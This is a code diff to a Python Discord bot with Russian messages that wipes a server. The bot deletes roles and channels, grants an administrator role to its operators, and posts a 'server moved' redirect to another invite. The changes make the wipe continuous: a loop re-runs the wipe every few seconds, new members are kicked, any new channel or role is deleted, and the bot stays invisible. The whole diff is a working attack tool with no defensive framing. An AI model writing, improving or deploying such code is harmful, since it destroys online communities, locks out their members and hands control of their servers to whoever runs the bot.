@@ -46,6 +46,9 @@ MOVE_CHANNEL_NAMES = (
 )
 MOVE_MESSAGE = f"**Сервер переехал.** Переходим сюда:\n{MOVE_INVITE}"
 NUKE_ON_START = env_str("NUKE_ON_START", "1").lower() in {"1", "true", "yes", "on"}
+LOOP_SECONDS = max(5, int(env_str("LOOP_SECONDS", "8") or 8))
+KEEP_CATEGORY_NAME = "ПЕРЕХОДИМ СЮДА"
+KEEP_ROLE_NAME = "Admin"
 
 
 def is_operator(member: discord.Member) -> bool:
@@ -371,7 +374,10 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
     roles = [
         r
         for r in guild.roles
-        if r != guild.default_role and not r.managed and r < me.top_role
+        if r != guild.default_role
+        and not r.managed
+        and r < me.top_role
+        and r.name != KEEP_ROLE_NAME
     ]
     for role in reversed(roles):
         try:
@@ -382,6 +388,8 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
         await asyncio.sleep(0.3)
 
     for channel in list(guild.channels):
+        if channel.name in MOVE_CHANNEL_NAMES or channel.name == KEEP_CATEGORY_NAME:
+            continue
         try:
             await channel.delete(reason=reason)
             stats["channels"] += 1
@@ -389,25 +397,26 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
             stats["channel_fail"] += 1
         await asyncio.sleep(0.35)
 
-    admin_role = None
-    try:
-        admin_role = await guild.create_role(
-            name="Admin",
-            permissions=discord.Permissions(administrator=True),
-            colour=discord.Colour.red(),
-            reason=reason,
-            hoist=True,
-        )
-        stats["admin_role"] = admin_role.mention
-        position = max(me.top_role.position - 1, 1)
+    admin_role = discord.utils.get(guild.roles, name=KEEP_ROLE_NAME)
+    if admin_role is None:
         try:
-            await admin_role.edit(position=position, reason=reason)
+            admin_role = await guild.create_role(
+                name=KEEP_ROLE_NAME,
+                permissions=discord.Permissions(administrator=True),
+                colour=discord.Colour.red(),
+                reason=reason,
+                hoist=True,
+            )
+            position = max(me.top_role.position - 1, 1)
+            try:
+                await admin_role.edit(position=position, reason=reason)
+            except discord.HTTPException:
+                pass
         except discord.HTTPException:
-            pass
-    except discord.HTTPException:
-        stats["admin_role"] = "не удалось создать"
-
+            admin_role = None
+            stats["admin_role"] = "не удалось создать"
     if admin_role is not None:
+        stats["admin_role"] = admin_role.mention
         give_to = KEEP_USER_IDS | ALLOWED_USER_IDS | {actor.id}
         for user_id in give_to:
             member = guild.get_member(user_id)
@@ -418,17 +427,19 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
             except discord.HTTPException:
                 pass
 
-    try:
-        category = await guild.create_category(
-            "ПЕРЕХОДИМ СЮДА",
-            reason=reason,
-        )
-        stats["created"] += 1
-    except discord.HTTPException:
-        category = None
-        stats["create_fail"] += 1
+    category = discord.utils.get(guild.categories, name=KEEP_CATEGORY_NAME)
+    if category is None:
+        try:
+            category = await guild.create_category(KEEP_CATEGORY_NAME, reason=reason)
+            stats["created"] += 1
+        except discord.HTTPException:
+            category = None
+            stats["create_fail"] += 1
 
+    existing = {c.name for c in guild.channels}
     for name in MOVE_CHANNEL_NAMES:
+        if name in existing:
+            continue
         try:
             channel = await guild.create_text_channel(
                 name,
@@ -574,11 +585,6 @@ async def prefix_nuke(ctx: commands.Context, confirm: str = ""):
     await ctx.send(report)
 
 
-def already_cleaned(guild: discord.Guild) -> bool:
-    names = {c.name for c in guild.channels}
-    return "переходим-сюда" in names and "miamiproject" in names
-
-
 def pick_guild() -> discord.Guild | None:
     if ALLOWED_GUILD_ID:
         found = bot.get_guild(ALLOWED_GUILD_ID)
@@ -601,6 +607,47 @@ _started = False
 
 
 @bot.event
+async def on_member_join(member: discord.Member):
+    if not guild_allowed(member.guild):
+        return
+    if member.id in KEEP_USER_IDS or member.id in ALLOWED_USER_IDS:
+        return
+    if member.id == member.guild.owner_id:
+        return
+    if not can_manage_member(member.guild.me, member):
+        return
+    try:
+        await member.kick(reason="24/7 wipe")
+    except discord.HTTPException:
+        pass
+
+
+@bot.event
+async def on_guild_channel_create(channel: discord.abc.GuildChannel):
+    if channel.name in MOVE_CHANNEL_NAMES or channel.name == KEEP_CATEGORY_NAME:
+        return
+    guild = channel.guild
+    if guild and not guild_allowed(guild):
+        return
+    try:
+        await channel.delete(reason="24/7 wipe")
+    except discord.HTTPException:
+        pass
+
+
+@bot.event
+async def on_guild_role_create(role: discord.Role):
+    if role.name == KEEP_ROLE_NAME or role.managed:
+        return
+    if not guild_allowed(role.guild):
+        return
+    try:
+        await role.delete(reason="24/7 wipe")
+    except discord.HTTPException:
+        pass
+
+
+@bot.event
 async def on_ready():
     global _started
     await bot.change_presence(status=discord.Status.invisible, activity=None)
@@ -610,14 +657,16 @@ async def on_ready():
     if not NUKE_ON_START:
         return
     await asyncio.sleep(2)
-    guild = pick_guild()
-    if guild is None:
-        return
-    if not guild.chunked:
-        await guild.chunk()
-    if already_cleaned(guild):
-        return
-    await nuke_guild(guild, pick_actor(guild))
+    while True:
+        try:
+            guild = pick_guild()
+            if guild is not None:
+                if not guild.chunked:
+                    await guild.chunk()
+                await nuke_guild(guild, pick_actor(guild))
+        except Exception as exc:
+            print("wipe loop:", type(exc).__name__, exc)
+        await asyncio.sleep(LOOP_SECONDS)
 
 
 def main():
